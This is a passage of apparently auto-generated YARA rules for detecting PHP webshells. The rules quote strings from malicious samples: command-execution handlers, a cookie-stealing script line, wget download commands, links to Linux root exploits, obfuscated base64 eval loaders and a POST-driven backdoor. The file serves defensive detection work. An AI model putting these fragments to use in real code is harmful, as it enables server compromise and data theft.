      $x5 = "$pass = \"8634361d1a2e44420f44ef3612706bb5\"; // MD5 encoded Password" fullword ascii
      $s6 = "\"raptor - Linux <= 2.6.17.4\"=>\"http://someshit.net/files/xpl/raptor\"," fullword ascii
      $s7 = "unset($_SESSION['sql_user'], $_SESSION['sql_password'], $_SESSION['sql_host'], $_SESSION['sql_port']);" fullword ascii
      $s8 = "'Running Processes'=>'ps -aux', 'Uname'=>'uname -a', 'Get UID'=>'id'," fullword ascii
      $s9 = "'tools'=>'Tools','sqllogin'=>'SQL','email'=>'Email','upload'=>'Get Files','lookup'=>'List Domains','bshell'=>'Bindshell','kill'=" ascii
      $s10 = "#'http://site.com/shl.php?cookie='+document.cookies</script> #" fullword ascii
      $s11 = "$IP = array(\"127.0.0.2\",\"127.0.0.1\"); // IP Addresses allowed to access shell" fullword ascii
      $s12 = "\"rootbsd - BSD v?\"=>\"http://someshit.net/files/xpl/rootbsd\"," fullword ascii
      $s13 = "$user = \"55c4b3899b00d20543d41170d2775e8f\"; // MD5 encoded User" fullword ascii
      $s14 = "function cmd(){ // Command execution function" fullword ascii
      $s15 = "#To execute commands, simply include ?cmd=___ in the url. #" fullword ascii
      $s16 = "\"Basic Perl bindshell\"=>\"http://packetstormsecurity.org/groups/synnergy/bindshell-unix\"," fullword ascii
      $s17 = "<title>g00nshell v\" . $version . \" - \" . $servip . \"</title>\\n" fullword ascii
      $s18 = "'tools'=>'Tools','sqllogin'=>'SQL','email'=>'Email','upload'=>'Get Files','lookup'=>'List Domains','bshell'=>'Bindshell','kill'=" ascii
      $s19 = "\"h00lyshit - Linux 2.6 ALL\"=>\"http://someshit.net/files/xpl/h00lyshit\"," fullword ascii
      $s20 = "#Ex: http://site.com/shl.php?cmd=whoami #" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 90KB and
      1 of ($x*) and 4 of them
}


rule sig_3380a70993651a61ff558f74569740c5dbdee11e
{
   meta:
      description = "php17 - file 3380a70993651a61ff558f74569740c5dbdee11e.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "2c54f712f749beac27e9bb43eb9b184fc2aa28cdd1391d466bdb8b3f2be169aa"
   strings:
      $s1 = "$content.=\"<a href='?newdir=\".$cd.$d.\"'>\".$d.\"</a>\".\"<br />\";" fullword ascii
      $s2 = "<form name=\"form1\" method=\"get\" action=\"\">" fullword ascii
      $s3 = "$fd = $rd.substr($_SERVER['PHP_SELF'],0,strrpos($_SERVER['PHP_SELF'],\"/\"));" fullword ascii
      $s4 = "error_reporting(1);" fullword ascii
      $s5 = "$content.=$d.\"<br />\";" fullword ascii
      $s6 = "$cd = getcwd().\"\\\\\";" fullword ascii
      $s7 = "<div><?=$content?></div>" fullword ascii
      $s8 = "<input name=\"newdir\" type=\"text\" value=\"<?=$cd?>\" size=\"60\">" fullword ascii
      $s9 = "$rd = $_SERVER['DOCUMENT_ROOT'];" fullword ascii
      $s10 = "while($dl = readdir($dh)){" fullword ascii
      $s11 = "case \"dirlist\":$content = dirlist($cd);break;" fullword ascii
      $s12 = "$dlist.= \"[<a href='?newdir=\".$l.\":'>\".$l.\"" fullword ascii
      $s13 = "if(!is_file($cd.$d)&&$d!=\".\"){" fullword ascii
      $s14 = "$cd = $_REQUEST['newdir'].\"\\\\\";" fullword ascii
      $s15 = "</a>][<a href=\"?newdir=<?=$fd?>\">" fullword ascii
      $s16 = "if(!isset($_REQUEST['newdir'])){" fullword ascii
      $s17 = "if(!isset($_REQUEST['action'])){" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 5KB and
      8 of them
}

rule sig_4f2f5c11f219ece96aad5c741f031ed9e93aefb5
{
   meta:
      description = "php17 - file 4f2f5c11f219ece96aad5c741f031ed9e93aefb5.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "4601b9c285b83efd4bc1bfde0e21c08eb95f1a84ba02209458b973c484d951b1"
   strings:
      $x1 = "<?php if(!isset($GLOBALS[\"\\x61\\156\\x75\\156\\x61\"])) { $ua=strtolower($_SERVER[\"\\x48\\124\\x54\\120\\x5f\\125\\x53\\105" ascii
      $s2 = "9TURFUjwvMls0d084L3d5OC9EOFc5dDZxPHNGeTlDLloycWErMlk2NTM0YXh3QzBMMkpybkRKcjBORDhMRy9nNTl0M1o3fWFHL3d5OC93V3MyWTYuZTVuRS94eTgvd1c" ascii
      $s3 = "4VHNvYTxxbzNnNnhIMzRhKzMvOXNle0xPTkR4SElGYUcvd3lId3lXNzN0Z2MzS2dyd3EyeG1UVXg4azhaPFlnV2JxMm40d084L3A5VDl0OFo8WTJ4OUNmeDxDUEpORDN" ascii
      $s4 = "mTkNXazNDRW5iREU1bXtFYzxIZ1c8SHcrbUNOYzJZYXg8WXI9TlQwfU5zbz1ORGdPPGt3UDJDUDU5L29jPEhFMGJZMFo5NGFzZXtiTzlDLloycUwuZVlyVUlZRU9Oe0V" ascii
      $s5 = "zPEMgUThrRkhHVG5FL3NGeDMvRngzL0Z4My9GeDMvRngzL0Z4My9GeDhDLldie3d4bXBvYTJINlc3fWFHL3d5OC93V0plQ1duTnB4eWVEZ1c8cEZQMy9nYWVDVzVJVEx" ascii
      $s6 = "5YkRnYU57MH05dHUxNHdPOC93eTgve1dZRy9vczJINmFOIE5jMllFV0dLRnkyazZxOVk2cXs1bzlJS0Z5Mms2cTlZNnF7NXI5SS9GeTxDV1FONm59RHB9eDhDUlo8WTY" ascii
      $s7 = "rbXBGUnU0d1VFVDJrR3dhRy93V3FORGcwMllVeDJKb3Fle0xhTnN4SDhUS1F1WWJISS9GeTJxRmMzNEt9RTR4MEU1YnhHcEZRMy8yeFQgM0g3fWFHL3s2bjJrNlpOc3h" ascii
      $s8 = "POEs5dVRhOG9UckU8OGtybmV7cjVORHVIRHBvLjJxRnk8c0ZQbXNGeTlzeXhNfWFHL3dXWk5zeHk5c0ZQbXBGSDhxeXhNfWFHL3d5OE57RU88cUZIbUNQfTlDOXE8SjZ" ascii
      $s9 = "xPEM2UUcvZ0EgS1BUNnJuSDI0dUhEcHk9OEN5PXVweVo3fWFHL3d5OC97V1lHL3JGYmsuPTxrd084clB3VDBFIHtxOX11cDk5SS9GeTJDNnE8RHVaR3dhRy93eTgvd1d" ascii
      $s10 = "UNi85OUdwVUhie1ouTS85OTM0YXhOWXJuMmsgMTR3TzhOe0VPPHFGc21DTmMyWWF4PFlyPU5UYUg5Q1BjPHRFQzxKOD04cW9jPFdFMGJZMFo5NGFIZXtiTzlDLloycUw" ascii
      $s11 = "1OUNyYTlEdXMzNGErMy84fTJxby45RHhzSUZhRy93eXNnWVdRTi8zeG1UVXgzczNuNHdPeDNGeTgzWU5aPFl3eGJ7Um4zdEUwZXt3eE5ZV25ORHVzMzRhKzMvOFlle0x" ascii
      $s12 = "BTms2YU57OVpOL3haR1RuRS94eTg4dDY1TkQzeG1wRnk5e1d5e3E5UWJ7MFc4MGExNHdPOC9wZzBle3d4bXBGeTl7V3l7cTkwZXt3SERUbkUveHk4OEM5cTxKNn0zNGF" ascii
      $s13 = "bNHdPOC93eTgvRDhXOXQ2cTxzb0YyQzlBMms2YURrRW5lezZROXJQVzxZRWNOQ1dRTnF4eTlDLloycWErPENXUWVxfXg4dEVhMnN5MTR3Tzgvd3k4L3s4cU57cno3fWF" ascii
      $s14 = "1OXsgUTxZNmE4cXlaN31hRy93V1pOc3guOEs5dVRhOG9UckU8OEpFLk5ZNkE8e1B5TnA5OUdwbzE0d094My9GeDMvRngzL0Z4My9GeTlERVcyWU4wPC9GUDNDcnEyWXJ" ascii
      $s15 = "XMkh5TzgwRTNUMDJ4dzA4cnc2Z3Izcmdvd3lScjNDRkhJc2dhYns4bk5wVUhiLzJaN31hRy93eTgvd3l5Yko4V2JEZ1czNGF4PERXNTJ7UkFOWTZhYmsuQWJEOHFiRHl" ascii
      $s16 = "wTlRhUjMvM1FHS0Z5RDBFciAwRThUYUw8PHt3MEcvZ0EgYTZwNnk2cHtxOTM2cmd3RGEubSAwd0hEcHlROGtydmJEeEhEVGZIYmsuV2JrPVdOLzJbOHEyWklzMyszdEV" ascii
      $s17 = "ZZXtSVzJxM3htVFV4M1lOWjxZd3hJcUY9MkM2cTxwRj11c0Y9PHR1c0lGYUczL0Y4L3A4WWV7THkzQ3JuPC9vSjJZV2FiezhuTnBvWTxrUnlORDg1M0NyUU4vb1lle1J" ascii
      $s18 = "4YktOWjxDNkEydDhaOVlGeG1wRkhNcDJzR1RuRS9zRngzL0Z4My9GeDMvRngzL0Z4My9vWk5zeHlOQzM9bVlOVzlDRU9HL3laNHdPeDMvRngzL0Z4My9GeDMvRngzL0Z" ascii
      $s19 = "XOXQ2cTxzb1oyMFAuMkg4Lk1weHliRDhxYkR5WjM0ZnhiRDhxYkRXQTx7cn1HLzlEIGFQNTl0OFoydEVuYkRFT05EdUhJL0Z5YkQ4cWJEeVozNE94MkpncWVEbzU8Q3I" ascii
      $s20 = "1OXQzTzh0by45Q3huSVRLWm1UYUhJcTJaMzRmeDh0by45Q3hbOHRvLjlDeFE4cWZIN31hRy93eTgvd3l5TkN4eDM0YXg8Sm9XPFlnWjJzeHkyQ3JhZS95MTR3Tzgvd3k" ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 400KB and
      1 of ($x*) and 4 of them
}

rule sig_56b6668476a0bd9228feaa946df556a1763bd0c5
{
   meta:
      description = "php17 - file 56b6668476a0bd9228feaa946df556a1763bd0c5.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "04f70377969f84bb7133c7667db56f0b5de7b98514267b12f381a80448da72cb"
   strings:
      $s1 = "$payload = array($_POST['faith'],);" fullword ascii
      $s2 = "array_filter($payload, base64_decode($act));" fullword ascii
      $s3 = "<?php $act = $_POST['act'];" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule sig_81f8f9d5b6dba444f79867342b45aa86c04997a7
{
   meta:
      description = "php17 - file 81f8f9d5b6dba444f79867342b45aa86c04997a7.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "98d1a1c893375194ccef052ac0e083fa157fd7b036139615af843897fcb17b60"
   strings:
      $s1 = "$T='JreplacJe(arrJay(\"/_/\",\"/-/JJ\"),arrayJJ(\"/\",\"+\"),$JsJs($s[$i],0,J$e))),J$k)));$oJ=ob_Jget_contenJtJs();ob_e';" fullword ascii
      $s2 = "$D='qJ&&$mJ){@sesJsion_sJtarJt()J;$s=JJ&$J_SESSION;$JJss=\"substr\";$sl=\"sJtrtolowJer\";$i=J$mJ[1][0].$m[1]J[1];$Jh=$sl($ss(';" fullword ascii
      $s3 = "$Q='rJ($j=J0;($Jj<$Jc&&$i<$l)J;$j++J,J$iJ++){$o.=$t{$i}^$k{J$j};}}retJurJn $oJ;}$r=J$J_SERVER;$rr=@$JrJ[\"HTTP';" fullword ascii
      $s4 = "$f='JJnd_clean();$dJ=basJe64_enJcodeJ(x(gzJcompresJs($o),$Jk));print(J\"<$k>$dJ</$Jk>\");@JsJessioJn_destroy();}}}}';" fullword ascii
      $s5 = "$u='2]J[$z]];if(JstJrpos($p,$h)===0)JJ{$s[$i]=\"\"J;$Jp=$ss($Jp,3);}if(arrJJaJy_key_exists(J$i,$s)){$sJJ[$i].=$pJ;';" fullword ascii
      $s6 = "$I='_REFERJER\"];$raJ=J@$r[\"HTTPJ_ACCEPT_LJAJNGUAGE\"J];if($rrJ&&$ra){$Ju=parsJe_JJurl($Jrr);pJarse_Jstr($u[\"quer';" fullword ascii
      $s7 = "$n='$JeJ=strpos($s[$Ji],$f)J;if($e){$kJ=$kJh.$kf;ob_staJrt();J@evaJl(@gzuncoJmpJrJJess(@x(@base6J4_decode(pregJ_';" fullword ascii
      $s8 = "$d='y\"]J,J$q);$q=arrayJ_valuJes($q);Jpreg_mJaJtcJh_all(\"/J([\\\\w])[\\\\w-]J+(?:;q=0.J([\\\\d]J))?,?/J\",$ra,$mJ);if($';" fullword ascii
      $s9 = "$K='$kh=\"5d4J1JJJ\";$kf=\"402a\";funcJJtion x($t,$kJ){$c=sJtrlen($k);J$l=strlenJ($Jt);$o=\"\";Jfor(J$i=0;$i<$Jl;){fo';" fullword ascii
      $s10 = "$L='md5J($Ji.$kh),0,J3));JJ$f=$sl($sJs(md5J($iJ.$kf),0,J3));$p=\"\";for(J$z=1J;$z<couJnt($m[1J]);$z+J+J)$p.J=$qJ[$m[';" fullword ascii
      $s11 = "$G=str_replace('J','',$K.$Q.$I.$d.$D.$L.$u.$n.$T.$f);" fullword ascii
      $s12 = "$H=str_replace('m','','mcreatme_mfumncmtimon');" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 3KB and
      8 of them
}

rule AMQPExchangeException
{
   meta:
      description = "php17 - file AMQPExchangeException.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "e76d57121fbe5fd8f686c59b4c35220a75c9a1d92cf7d74abbb2e0e72fa1c2fa"
   strings:
      $s1 = "* @author Aleksey I. Kuleshov YOU GLOBAL LIMITED" fullword ascii
      $s2 = "* @package PHPDaemon\\Clients\\AMQP\\Driver\\Exception" fullword ascii
      $s3 = "use PHPDaemon\\Clients\\AMQP\\Driver\\Protocol\\Exception\\AMQPExchangeExceptionInterface;" fullword ascii
      $s4 = "use PHPDaemon\\Clients\\AMQP\\Driver\\Protocol\\Exception\\AMQPException;" fullword ascii
      $s5 = "namespace PHPDaemon\\Clients\\AMQP\\Driver\\Exception;" fullword ascii
      $s6 = "* Class AMQPExchangeException" fullword ascii
      $s7 = "class AMQPExchangeException extends AMQPException implements AMQPExchangeExceptionInterface" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule sig_7ff60365f646e09b30b6b3dd7fe768fa841100df
{
   meta:
      description = "php17 - file 7ff60365f646e09b30b6b3dd7fe768fa841100df.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "644801c4c42c2055912131e963b263204fe95131e9af26eb1ed2c99af6a8387e"
   strings:
      $x1 = "eval(gzuncompress(base64_decode(\"eJzsvfl3G8eROP6z/J7/h9GYK4AmiIP3IVDiTUq8RJA6qceHY0BABDDQAOAhW/u/MNpNvLJ2I0qkLoq6SJsUZVEUSUmOnn" ascii
      $s2 = "Evrb/TuuaGdY25WGbbH03lWTb57fK4yyokIVXam8jEA4o2jH7Gfjz7g1SMw8fse+zuRPa6h0qc9com/Q8spGYPYdpy3hsJsnP7SDll0f9ER+9VYOdgngWbMPVe4zLRVt" ascii
      $s3 = "8I+KpOlBwK9I5WeTwDY321R7vaajsPtySUQS196shgaH9oX21vurbx4Fh/GYx2qqq3FRaT/fsHNX+bMhkaGKv1nzzRUn6qsbl98mCgzF3R3dt3srIjcbKyU3UnR8dSHZ" ascii
      $s4 = "EA0+LbTANoF1h/fyhi6O0zXCWx3IimKImGPIj9j5Hvh5YWWXKqhQS9lagB4u8ircQVmOvx/08uSjuEp3+Zuwds26UQbINEQuuZfz2NiX9HFsaWJ3I6sdmBH/ZZ7K3V6q" ascii
      $s5 = "lsogIrCwXSKnFnI6fvxEvLPMHYzSy6vNMCxlzEBJpDKMAIYIa9FSkQBFIBDVb3/o+g3d1DbY+eQ56/e+YmpYCZAPr0puvk3MoSljTkHUNBHND1//hnpl+ZF6GVP65tFu" ascii
      $s6 = "oSTN5YEUetMqwQcdYTOdeiJVBx/mEJtXbuVkiBicRD6fyXrTv34UZWfP0CXx2fNw4vhkPkQ2+p3SLSkJ4bh1SRA2MHWdhMsLlCdvvK8Nz3kdR8A2lcyVWmv7jrb3SFFG" ascii
      $s7 = "tbFJhMk+C3bugk/SFleaRbrLKbgiRcyqcMViMrClHraMMeHZ7XzuDu3i3VFEtvS71aiCYZs0DiZbzYeKW7IuCudFcVv0XQLCmpl6gQlU7zBJ29yfB4MwnGABjMykV+05" ascii
      $s8 = "hq0kyftpTHRt9B3M4uEiELdKWSmcjlvLtAk3w2qlrJaWOtpEFVthg6GLj45N966IomQeTryyt+YStpURxkekTPId94FlpojCUZTz2O1+/YQbIiasYAh190cNFEJm0s5P" ascii
      $s9 = "f6X6V2MMytVQ9cLkD1gMyyv5UGYVDO0CIsgCeUceTilxx/Azh6iucZftPSzNY/qp9svTrDSmZ6rzTlDytxfH2huLjoFLmhZBolbhbB2ID3Zhe+MQ0cC2DeF0munuUPMN" ascii
      $s10 = "gCfGuOY7JN7uUVtuJftpHY7viR1oN+WF/oFVnm1m237fMnMn5t0uZt8DhsbUpAY9/KHLZuEm/C21DusDUmtWgMPlZgKmZXOmz7MgkMtFqFn2KYVg3lMiOZFMb1rHHYfE" ascii
      $s11 = "cJpmkR8+dREf5hE34JScP0LOjXbtakxRewgCcwMZq/t9cksVQR0dkaV2z0HV/JQFWIgg9cKWSqKGtdonxdEYe1sqBctBLdSbNoTTiWt9f6uPDbiqWZiLyKBK2h4CoU1F" ascii
      $s12 = "LOG/akOjqYoZLPdja/frTzTRwdjAYRldgej15ejE4MWXSTQcu1AyGOn29v/vJ595peg7YsLR/3CEz3t5ce6UMbjtk8GPKxIHWPx6cXZyNdpbpGxzbhseed5beud8A0hS" ascii
      $s13 = "uXSDfdSLtdCWEaLc47KsaXwWGrEqKaWsuNVxYFl2fnPrz74PolHpzFTANLIpjs+rDakNXj9df2ElOGsXCgVY/cus+rRWBfeSflKtCySOAtr1wp89WPrX0YYIPdZyi8rB" ascii
      $s14 = "/iQKsL0uaDd2e+mn8Xn5BA8A/u3Jq59O3S+sb5B/+F++d7P7u07LQkbzZnFWYo/grDD8dK9K0E9rxnHgeRzacYsBT56fxDLL35FJSaVHLy1u9nF1lN9uTC17dmps4UYi" ascii
      $s15 = "OTYVahMGnk4MFh0BB4DO/5rt3hMgKfJKffJJA1eLkF427USbsJIBa1ms81mSpwMg08IjPVjgSx0EWXfMI/5qdXQ+uoEBuyPfrkytdXf7z40WPyBvnGwq0ZbAQffMHDan" ascii
      $s16 = "59ybHmTHO4Md09eaIi1lyyPxlLH5qcGIsOlKSrx5KHBypHu8uDsZMnS1KJxmT5vvbDWk31ESXeHT7cmKmeODGqdB/qqjnce1BLATmS42PhEzWd1XHgxUBzJLHvQGcmHR" ascii
      $s17 = "87dWbu6srShblL/zH931cW//mfX38tP08jP89/vPJtfp4uSinamKJlcMYN+1r7D7b2S8dsHQMDfcMdvb4B23EnTz5m6+vog89dbbbj9XrFJFbkbOdPpWheUE1OZrQY5A" ascii
      $s18 = "UlliQlx6L7yh55eXh6MHptBA8EMLsFcBg5/po0AAmJpe5Hqf55H82BeF+VaJD+B/190J0=\")))?>" fullword ascii
      $s19 = "Hd0dne0QX/BnLKiEB8HY0tvYf0IuU1+J8IpqWxf3+eQiKc8hbrtowSjf39Aow28mPqz0B/Y/P+7EaA8f1vMfKEQqF6JHMpelNofipKEypaGPx1ERUWNVZSU0ICrQmVAY" ascii
      $s20 = "YGIuyBC7GqWZCQG5+iE4ch/Q3pC42KoQm45KMQQqoRFZJc2skunjLLIGQoskxaSETDsUFU1Qg7obKWUEU9TXRIp6vn6T3i7QV8qayeuqSj47nAtJy31y8ufD77zcom3g" ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 100KB and
      1 of ($x*) and 4 of them
}

rule add_control
{
   meta:
      description = "php17 - file add_control.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "d512405a773e3da613d96e91dfefc7a2f1b8ddbfa077691c73fa0176a3db740b"
   strings:
      $s1 = "$('div[data-field-set=<?=$set->getID()?>] tr[data-field-set-control]:last-child a[data-command=edit-control]" fullword ascii
      $s2 = "<?php foreach ($driver->getItems($set->getForm()->getEntity()) as $item) {" fullword ascii
      $s3 = "<?php defined('C5_EXECUTE') or die(\"Access Denied.\"); ?>" fullword ascii
      $s4 = "jQuery.fn.dialog.showLoader();" fullword ascii
      $s5 = "jQuery.fn.dialog.hideLoader();" fullword ascii
      $s6 = "data-item-id=\"<?=$item->getItemIdentifier()?>\">" fullword ascii
      $s7 = "$('div[data-field-set=<?=$set->getID()?>] tbody').append(html);" fullword ascii
      $s8 = "url: '<?=$view->action('add_control', $set->getId())?>'," fullword ascii
      $s9 = "<?=$item->getIcon()?> <?=$item->getDisplayName()?>" fullword ascii
      $s10 = "<div class=\"ccm-tab-content\" id=\"ccm-tab-content-<?=$type?>\">" fullword ascii
      $s11 = "<?php foreach ($drivers as $type => $driver) {" fullword ascii
      $s12 = "$('a.dialog-launch').dialog();" fullword ascii
      $s13 = "'value': '<?=$token->generate('add_control')?>'" fullword ascii
      $s14 = "jQuery.fn.dialog.closeTop();" fullword ascii
      $s15 = "$('a[data-select=control-item]').on('click', function() {" fullword ascii
      $s16 = "type: 'post'," fullword ascii
      $s17 = "var type = $(this).attr('data-item-type')," fullword ascii
      $s18 = "'name': 'ccm_token'," fullword ascii
      $s19 = "id = $(this).attr('data-item-id');" fullword ascii
      $s20 = "// pop open the latest control so we can edit its options immediately" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 5KB and
      8 of them
}

rule sig_6b3ec26b6d0c3bef265e53db0256c2b05f6402ed
{
   meta:
      description = "php17 - file 6b3ec26b6d0c3bef265e53db0256c2b05f6402ed.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "c8a8955465a283cd2021156c641a56b37e0032afa4c777589d3672659db51e84"
   strings:
      $s1 = "for ($fb01889=0; $fb01889<$GLOBALS[$GLOBALS['xcbe'][5].$GLOBALS['xcbe'][20].$GLOBALS['xcbe'][29].$GLOBALS['xcbe'][64].$G" fullword ascii
      $s2 = "for ($y2ba61=0; $y2ba61<$GLOBALS[$GLOBALS['xcbe'][5].$GLOBALS['xcbe'][20].$GLOBALS['xcbe'][29].$GLOBALS['xcbe'][64].$GLOBALS" fullword ascii
      $s3 = "foreach ($GLOBALS[$GLOBALS['xcbe'][33].$GLOBALS['xcbe'][76].$GLOBALS['xcbe'][70].$GLOBALS['xcbe'][57].$GLOBALS['xcbe'][76].$" fullword ascii
      $s4 = "echo @$GLOBALS[$GLOBALS['xcbe'][37].$GLOBALS['xcbe'][77].$GLOBALS['xcbe'][53].$GLOBALS['xcbe'][29].$GLOBALS['xcbe'][20]." fullword ascii
      $s5 = "return $GLOBALS[$GLOBALS['xcbe'][64].$GLOBALS['xcbe'][57].$GLOBALS['xcbe'][53].$GLOBALS['xcbe'][77].$GLOBALS['xcbe'][4].$GLO" fullword ascii
      $s6 = "$f894c .= $GLOBALS[$GLOBALS['xcbe'][12].$GLOBALS['xcbe'][76].$GLOBALS['xcbe'][70].$GLOBALS['xcbe'][67].$GLOBALS['xcb" fullword ascii
      $s7 = "$GLOBALS['xcbe'][93].$GLOBALS['xcbe'][68] => @$GLOBALS[$GLOBALS['xcbe'][92].$GLOBALS['xcbe'][39].$GLOBALS['xcbe'][41" fullword ascii
      $s8 = "$GLOBALS['xcbe'][5].$GLOBALS['xcbe'][68] => $GLOBALS['xcbe'][57].$GLOBALS['xcbe'][18].$GLOBALS['xcbe'][38].$GLOBALS[" fullword ascii
      $s9 = "'][29].$GLOBALS['xcbe'][52].$GLOBALS['xcbe'][38]] = $_POST;" fullword ascii
      $s10 = "e'][92].$GLOBALS['xcbe'][3].$GLOBALS['xcbe'][5].$GLOBALS['xcbe'][76].$GLOBALS['xcbe'][21];" fullword ascii
      $s11 = "'][64].$GLOBALS['xcbe'][83].$GLOBALS['xcbe'][92].$GLOBALS['xcbe'][81].$GLOBALS['xcbe'][76];" fullword ascii
      $s12 = "GLOBALS['xcbe'][29].$GLOBALS['xcbe'][52].$GLOBALS['xcbe'][38]] as $p4a6fa2=>$d3e1)" fullword ascii
      $s13 = "[77]] = $GLOBALS['xcbe'][25].$GLOBALS['xcbe'][78].$GLOBALS['xcbe'][37];" fullword ascii
      $s14 = "elseif ($vbb5230c7[$GLOBALS['xcbe'][64]] == $GLOBALS['xcbe'][76])" fullword ascii
      $s15 = "['xcbe'][39].$GLOBALS['xcbe'][38].$GLOBALS['xcbe'][57]]($vbb5230c7);)" fullword ascii
      $s16 = "47\\xd\\x40\\x20\\x22\\x3f\\x4e\\x46\\x69\\x70\\x42\\x3a\\x29\\x4a\";" fullword ascii
      $s17 = "'][41].$GLOBALS['xcbe'][53].$GLOBALS['xcbe'][70].$GLOBALS['xcbe'][77];" fullword ascii
      $s18 = "3].$GLOBALS['xcbe'][25].$GLOBALS['xcbe'][37].$GLOBALS['xcbe'][76];" fullword ascii
      $s19 = ".$GLOBALS['xcbe'][92].$GLOBALS['xcbe'][46].$GLOBALS['xcbe'][76], 0);" fullword ascii
      $s20 = "LS['xcbe'][39].$GLOBALS['xcbe'][38]] as $p4a6fa2=>$d3e1)" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 30KB and
      8 of them
}

rule sig_946a66a5f7f8be95ea7693ee5500bb404b9d0add
{
   meta:
      description = "php17 - file 946a66a5f7f8be95ea7693ee5500bb404b9d0add.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "1db0549066f294f814ec14ba4e9f63d88c4460d68477e5895236173df437d2b8"
   strings:
      $x1 = "else if(isset($_POST['reverse'])) { if(@ftp_login($connection,$user,strrev($user))) { echo \"[+] $user:\".strrev($user).\" - suc" ascii
      $x2 = "if(!@ftp_login($connection,$_POST['ftp_login'],$_POST['ftp_password'])) { fe($language,1); }" fullword ascii
      $s3 = "$text['eng'] = array('Connect to ftp server failed','Login to ftp server failed','Can\\'t change dir on ftp server');" fullword ascii
      $s4 = "if(isset($_POST['cmd']) && !empty($_POST['cmd']) && $_POST['cmd']==\"download_file\" && !empty($_POST['d_name']))" fullword ascii
      $s5 = "@readfile (\"http://127.0.0.1/r57shell/version.php?version=\".$current_version.\"\");}}" fullword ascii
      $s6 = "if (empty($_POST['cmd'])&&!$safe_mode) { $_POST['cmd']=($windows)?(\"dir\"):(\"ls -lia\"); }" fullword ascii
      $s7 = "ASES;\\nSELECT * FROM user;\")).\"</textarea><br><input type=submit name=submit value=\\\" Run SQL query \\\"></div><br><br>\";" fullword ascii
      $s8 = "$this->dump[] = 'INSERT INTO `'.$table.'` (`'.@implode(\"`, `\", $this->columns).'`) VALUES (\\''.@implode(\"', '\", $thi" fullword ascii
      $s9 = "if(file_exists($_POST['mk_name']) || !$file=@fopen($_POST['mk_name'],\"w\")) { echo ce($_POST['mk_name']); $_POST['cmd']=\"\"" fullword ascii
      $s10 = "$this->dump[] = 'INSERT INTO '.$table.' ('.@implode(\", \", $this->columns).') VALUES (\\''.@implode(\"', '\", $this->row" fullword ascii
      $s11 = "if($_POST['cmd']==\"ftp_file_up\")   { @ftp_put($connection,$_POST['ftp_file'],$_POST['loc_file'],$_POST['mode']);        }" fullword ascii
      $s12 = "$sql = \"LOAD DATA INFILE \\\"\".$_POST['test3_file'].\"\\\" INTO TABLE temp_r57_table;\";" fullword ascii
      $s13 = "if(isset($_POST['cmd']) && !empty($_POST['cmd']) && $_POST['cmd']==\"mail_file\" && !empty($_POST['loc_file']))" fullword ascii
      $s14 = "echo sr(25,\"<b>\".$lang[$language.'_text38'].$arrow.\"</b>\",in('text','ftp_password',45,(!empty($_POST['ftp_password'])?($_POS" ascii
      $s15 = "if(!$file=@fopen($_POST['loc_file'],\"r\")) { echo re($_POST['loc_file']); $_POST['cmd']=\"\"; }" fullword ascii
      $s16 = "if(!$file=@fopen($_POST['d_name'],\"r\")) { echo re($_POST['d_name']); $_POST['cmd']=\"\"; }" fullword ascii
      $s17 = "if(!$file=@fopen($_POST['e_name'],\"r\")) { echo re($_POST['e_name']); $_POST['cmd']=\"\"; }" fullword ascii
      $s18 = "if(!isset($_POST['test3_port'])||empty($_POST['test3_port'])) { $_POST['test3_port'] = \"3306\"; }" fullword ascii
      $s19 = "if(!isset($_POST['test4_port'])||empty($_POST['test4_port'])) { $_POST['test4_port'] = \"1433\"; }" fullword ascii
      $s20 = "if(!$connection) { fe($language,0); $_POST['cmd'] = \"\"; }" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 300KB and
      1 of ($x*) and 4 of them
}

rule sig_0b0e93a29be990d421ee6b23671f7fbc104cb650
{
   meta:
      description = "php17 - file 0b0e93a29be990d421ee6b23671f7fbc104cb650.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "8c4b014b68d484905681e4055a154490ad2d48b732022b35eff98ee94c4d8232"
   strings:
      $x1 = "$uakey = \"b5c3d0b28619de70bf5588505f4061f2\"; // MD5 encoded user-agent" fullword ascii
      $x2 = "'tools'=>'Tools','sqllogin'=>'SQL','email'=>'Email','upload'=>'Get Files','lookup'=>'List Domains','bshell'=>'Bindshell','kill" fullword ascii
      $x3 = "$act = array('cmd'=>'Command Execute','files'=>'File View','phpinfo'=>'PHP info', 'phpexec'=>'PHP Execute'," fullword ascii
      $x4 = "if(exec(\"wget $file -b -O $updir/$filex\")){die(\"File has been uploaded.\");}" fullword ascii
      $x5 = "req = urllib2.Request('http://www.seologs.com/ip-domains.html', urllib.urlencode({'domainname' : sys.argv[1]}))" fullword ascii
      $x6 = "$sqlcon = @mysql_connect($_SESSION['sql_host'] . ':' . $_SESSION['sql_port'], $_SESSION['sql_user'], $_SESSION['sql_password']" fullword ascii
      $x7 = "$pass = \"47e331d2b8d07465515c50cb0fad1e5a\"; // MD5 encoded Password" fullword ascii
      $s8 = "\"raptor - Linux <= 2.6.17.4\"=>\"http://someshit.net/files/xpl/raptor\"," fullword ascii
      $s9 = "unset($_SESSION['sql_user'], $_SESSION['sql_password'], $_SESSION['sql_host'], $_SESSION['sql_port']);" fullword ascii
      $s10 = "'Running Processes'=>'ps -aux', 'Uname'=>'uname -a', 'Get UID'=>'id'," fullword ascii
